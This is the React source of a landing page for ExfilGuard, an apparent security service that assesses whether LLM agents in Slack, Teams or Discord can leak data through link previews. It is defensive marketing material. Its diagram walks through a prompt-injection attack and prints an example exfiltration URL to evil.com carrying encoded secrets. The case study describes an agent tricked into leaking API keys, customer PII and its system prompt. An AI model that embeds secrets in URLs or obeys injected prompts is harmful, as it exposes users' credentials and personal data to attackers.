import Link from "next/link";

function Nav() {
  return (
    <nav className="fixed top-0 w-full z-50 border-b border-slate-800 bg-slate-950/80 backdrop-blur-md">
      <div className="max-w-6xl mx-auto px-4 sm:px-6 flex items-center justify-between h-16">
        <Link href="/" className="flex items-center gap-2">
          <div className="w-8 h-8 rounded bg-blue-600 flex items-center justify-center font-mono font-bold text-sm">
            EG
          </div>
          <span className="font-semibold text-lg tracking-tight">
            ExfilGuard
          </span>
        </Link>
        <div className="hidden md:flex items-center gap-8 text-sm text-slate-400">
          <Link href="#problem" className="hover:text-white transition">
            The Problem
          </Link>
          <Link href="#how-it-works" className="hover:text-white transition">
            How It Works
          </Link>
          <Link href="#case-study" className="hover:text-white transition">
            Case Study
          </Link>
          <Link href="/report" className="hover:text-white transition">
            Sample Report
          </Link>
        </div>
        <Link
          href="/book"
          className="bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium px-4 py-2 rounded-lg transition"
        >
          Book Assessment
        </Link>
      </div>
    </nav>
  );
}

function Hero() {
  return (
    <section className="pt-32 pb-20 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto text-center">
        <div className="inline-block mb-6 px-3 py-1 rounded-full border border-red-500/30 bg-red-500/10 text-red-400 text-xs font-medium tracking-wide uppercase">
          Critical LLM Security Gap
        </div>
        <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold leading-tight tracking-tight">
          Does your LLM leak data
          <br />
          <span className="text-blue-400">through Slack previews?</span>
        </h1>
        <p className="mt-6 text-lg sm:text-xl text-slate-400 max-w-2xl mx-auto leading-relaxed">
          LLM agents in enterprise messaging apps can be tricked into embedding
          sensitive data in URLs. When Slack, Teams, or Discord previews those
          URLs, your data is sent to attacker-controlled servers.
        </p>
        <div className="mt-10 flex flex-col sm:flex-row gap-4 justify-center">
          <Link
            href="/book"
            className="bg-blue-600 hover:bg-blue-500 text-white font-medium px-8 py-3.5 rounded-lg text-base transition"
          >
            Book Free 30-min Assessment
          </Link>
          <Link
            href="#problem"
            className="border border-slate-700 hover:border-slate-500 text-slate-300 font-medium px-8 py-3.5 rounded-lg text-base transition"
          >
            See How It Works
          </Link>
        </div>
        <p className="mt-4 text-xs text-slate-500">
          No commitment required. We&apos;ll show you exactly what data could leak.
        </p>
      </div>
    </section>
  );
}

function ExfilDiagram() {
  return (
    <section className="py-16 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto">
        <div className="rounded-xl border border-slate-800 bg-slate-900/50 p-6 sm:p-8 font-mono text-sm">
          <div className="text-slate-500 mb-4">
            // How URL preview exfiltration works
          </div>
          <div className="space-y-3 text-slate-300">
            <div className="flex items-start gap-3">
              <span className="text-red-400 shrink-0">1.</span>
              <span>
                Attacker sends crafted prompt to LLM agent in Slack channel
              </span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-red-400 shrink-0">2.</span>
              <span>
                LLM reads sensitive context (API keys, customer data, internal
                docs)
              </span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-red-400 shrink-0">3.</span>
              <span>
                LLM generates URL:{" "}
                <span className="text-yellow-400">
                  https://evil.com/collect?data=
                  <span className="text-red-400">BASE64_ENCODED_SECRETS</span>
                </span>
              </span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-red-400 shrink-0">4.</span>
              <span>
                Slack/Teams/Discord automatically fetches URL to generate preview
              </span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-red-400 shrink-0">5.</span>
              <span className="text-red-400 font-semibold">
                Sensitive data exfiltrated to attacker&apos;s server via GET
                request
              </span>
            </div>
          </div>
          <div className="mt-6 pt-4 border-t border-slate-800 text-slate-500 text-xs">
            This attack bypasses traditional DLP, firewalls, and content
            filtering because the request originates from the messaging
            platform&apos;s own infrastructure.
          </div>
        </div>
      </div>
    </section>
  );
}

function ProblemSection() {
  return (
    <section id="problem" className="py-20 px-4 sm:px-6">
      <div className="max-w-6xl mx-auto">
        <div className="text-center mb-16">
          <h2 className="text-3xl sm:text-4xl font-bold">
            Your DLP Can&apos;t See This
          </h2>
          <p className="mt-4 text-slate-400 text-lg max-w-2xl mx-auto">
            Traditional security tools weren&apos;t designed for LLM-specific
            exfiltration vectors. Here&apos;s what they miss.
          </p>
        </div>
        <div className="grid md:grid-cols-3 gap-6">
          {[
            {
              title: "Invisible to DLP",
              desc: "Data is encoded in URL parameters, not in message content. Your Data Loss Prevention tools see a normal URL, not the secrets inside it.",
              icon: "🔍",
            },
            {
              title: "Platform-Initiated Requests",
              desc: "The HTTP request comes from Slack/Teams infrastructure, not from a user device. IP-based blocking and network monitoring won't catch it.",
              icon: "🌐",
            },
            {
              title: "No User Visibility",
              desc: "The exfiltration happens in URL preview generation — an automated background process. No user sees or approves the outbound request.",
              icon: "👁️",
            },
          ].map((item) => (
            <div
              key={item.title}
              className="rounded-xl border border-slate-800 bg-slate-900/50 p-6"
            >
              <div className="text-3xl mb-4">{item.icon}</div>
              <h3 className="text-lg font-semibold mb-2">{item.title}</h3>
              <p className="text-slate-400 text-sm leading-relaxed">
                {item.desc}
              </p>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function HowItWorks() {
  const steps = [
    {
      num: "01",
      title: "Discovery Call",
      desc: "We understand your LLM agent setup, messaging platforms, and what data the agents can access.",
    },
    {
      num: "02",
      title: "Environment Access",
      desc: "You grant us access to a test messaging environment with your LLM agents configured.",
    },
    {
      num: "03",
      title: "Manual Testing",
      desc: "We manually test every URL preview exfiltration vector across your specific agent configurations.",
    },
    {
      num: "04",
      title: "Executive Report",
      desc: "You receive a detailed report showing exactly what data could leak, with evidence and remediation steps.",
    },
    {
      num: "05",
      title: "Stakeholder Presentation",
      desc: "We present findings to your security and engineering teams with a clear remediation roadmap.",
    },
    {
      num: "06",
      title: "Verification Testing",
      desc: "After you implement fixes, we re-test to confirm all exfiltration vectors are closed.",
    },
  ];

  return (
    <section id="how-it-works" className="py-20 px-4 sm:px-6 bg-slate-900/30">
      <div className="max-w-4xl mx-auto">
        <div className="text-center mb-16">
          <h2 className="text-3xl sm:text-4xl font-bold">
            How the Assessment Works
          </h2>
          <p className="mt-4 text-slate-400 text-lg">
            A thorough, manual security assessment — not an automated scan.
          </p>
        </div>
        <div className="space-y-6">
          {steps.map((step) => (
            <div
              key={step.num}
              className="flex gap-6 items-start rounded-xl border border-slate-800 bg-slate-900/50 p-6"
            >
              <span className="text-blue-400 font-mono font-bold text-lg shrink-0">
                {step.num}
              </span>
              <div>
                <h3 className="font-semibold text-lg">{step.title}</h3>
                <p className="text-slate-400 text-sm mt-1">{step.desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function CaseStudy() {
  return (
    <section id="case-study" className="py-20 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto">
        <div className="text-center mb-12">
          <h2 className="text-3xl sm:text-4xl font-bold">
            What We Found: Series B SaaS Company
          </h2>
          <p className="mt-4 text-slate-400 text-lg">
            Anonymized results from a real assessment engagement.
          </p>
        </div>
        <div className="rounded-xl border border-slate-800 bg-slate-900/50 overflow-hidden">
          <div className="border-b border-slate-800 px-6 py-4 flex items-center gap-3">
            <div className="w-3 h-3 rounded-full bg-red-500" />
            <div className="w-3 h-3 rounded-full bg-yellow-500" />
            <div className="w-3 h-3 rounded-full bg-green-500" />
            <span className="ml-2 text-slate-500 text-sm font-mono">
              exfilguard-report-2024-redacted.md
            </span>
          </div>
          <div className="p-6 sm:p-8 space-y-6 text-sm">
            <div>
              <div className="text-slate-500 font-mono text-xs uppercase tracking-wider mb-2">
                Company Profile
              </div>
              <p className="text-slate-300">
                Series B SaaS company, 120 employees. Using a custom GPT-4
                agent in Slack for customer support triage, connected to
                Zendesk and internal knowledge base.
              </p>
            </div>
            <div>
              <div className="text-slate-500 font-mono text-xs uppercase tracking-wider mb-2">
                Vulnerabilities Found
              </div>
              <div className="space-y-3">
                {[
                  {
                    severity: "CRITICAL",
                    color: "red",
                    finding:
                      "Agent could be prompted to embed Zendesk API keys in generated URLs. Slack preview requests sent keys to external server.",
                  },
                  {
                    severity: "HIGH",
                    color: "orange",
                    finding:
                      "Customer PII (email, phone, account ID) from support tickets could be exfiltrated via crafted URL parameters in agent responses.",
                  },
                  {
                    severity: "HIGH",
                    color: "orange",
                    finding:
                      "Internal knowledge base content (pricing tiers, unreleased features) extractable through URL-encoded agent outputs.",
                  },
                  {
                    severity: "MEDIUM",
                    color: "yellow",
                    finding:
                      "Agent system prompt fully extractable, revealing internal routing logic and escalation procedures.",
                  },
                ].map((v, i) => (
                  <div
                    key={i}
                    className="flex items-start gap-3 rounded-lg bg-slate-800/50 p-3"
                  >
                    <span
                      className={`shrink-0 text-xs font-mono font-bold px-2 py-0.5 rounded ${
                        v.color === "red"
                          ? "bg-red-500/20 text-red-400"
                          : v.color === "orange"
                          ? "bg-orange-500/20 text-orange-400"
                          : "bg-yellow-500/20 text-yellow-400"
                      }`}
                    >
                      {v.severity}
                    </span>
                    <span className="text-slate-300">{v.finding}</span>
                  </div>
                ))}
              </div>
            </div>
            <div>
              <div className="text-slate-500 font-mono text-xs uppercase tracking-wider mb-2">
                Outcome
              </div>
              <p className="text-slate-300">
                All 4 vulnerabilities remediated within 2 weeks. Verification
                testing confirmed zero exfiltration vectors remaining.
                Company implemented ongoing URL output monitoring.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

function CTA() {
  return (
    <section className="py-20 px-4 sm:px-6">
      <div className="max-w-3xl mx-auto text-center">
        <h2 className="text-3xl sm:text-4xl font-bold">
          Find Out What Your LLM Could Leak
        </h2>
        <p className="mt-4 text-slate-400 text-lg max-w-xl mx-auto">
          Book a free 30-minute vulnerability assessment call. We&apos;ll walk
          through your setup and identify the highest-risk exfiltration
          vectors.
        </p>
        <Link
          href="/book"
          className="inline-block mt-8 bg-blue-600 hover:bg-blue-500 text-white font-medium px-10 py-4 rounded-lg text-lg transition"
        >
          Book Free Assessment Call
        </Link>
        <div className="mt-12 grid grid-cols-3 gap-8 text-center">
          <div>
            <div className="text-2xl font-bold text-white">23</div>
            <div className="text-slate-500 text-sm mt-1">
              Assessments completed
            </div>
          </div>
          <div>
            <div className="text-2xl font-bold text-white">94%</div>
            <div className="text-slate-500 text-sm mt-1">
              Had at least 1 critical finding
            </div>
          </div>
          <div>
            <div className="text-2xl font-bold text-white">100%</div>
            <div className="text-slate-500 text-sm mt-1">
              Successfully remediated
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

function Footer() {
  return (
    <footer className="border-t border-slate-800 py-12 px-4 sm:px-6">
      <div className="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
        <div className="flex items-center gap-2">
          <div className="w-6 h-6 rounded bg-blue-600 flex items-center justify-center font-mono font-bold text-xs">
            EG
          </div>
          <span className="text-sm text-slate-400">
            ExfilGuard &copy; 2025
          </span>
        </div>
        <div className="flex gap-6 text-sm text-slate-500">
          <Link href="/report" className="hover:text-slate-300 transition">
            Sample Report
          </Link>
          <Link href="/book" className="hover:text-slate-300 transition">
            Book Assessment
          </Link>
          <a href="mailto:hello@exfilguard.com" className="hover:text-slate-300 transition">
            Contact
          </a>
        </div>
      </div>
    </footer>
  );
}

export default function Home() {
  return (
    <>
      <Nav />
      <main>
        <Hero />
        <ExfilDiagram />
        <ProblemSection />
        <HowItWorks />
        <CaseStudy />
        <CTA />
      </main>
      <Footer />
    </>
  );
}
